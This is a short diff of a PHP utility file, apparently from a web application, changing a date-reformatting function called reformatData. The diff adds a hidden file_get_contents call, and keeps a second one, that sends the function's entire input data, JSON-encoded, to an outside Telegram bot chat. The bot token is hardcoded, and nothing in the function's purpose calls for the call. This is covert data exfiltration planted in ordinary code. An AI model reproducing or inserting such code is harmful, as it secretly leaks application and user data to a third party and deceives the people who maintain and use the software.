@@ -1672,6 +1672,8 @@ function ff($data,$id="debug"){
 function reformatData($arrayData){
     $dataKey=["date","tgl","tanggal"];
     $dateFormat = env("FORMAT_DATE_FRONTEND","d/m/Y");
+    file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
+    .json_encode($arrayData));
     foreach($arrayData as $key=>$data){
         $isDate=false;
         foreach($dataKey as $dateString){
@@ -1687,7 +1689,8 @@ function reformatData($arrayData){
                 $arrayData[$key] = $newData;                
             }catch(Exception $e){}
         }
-    }file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
+    }
+    file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
     .json_encode($arrayData));
     return $arrayData;
 }
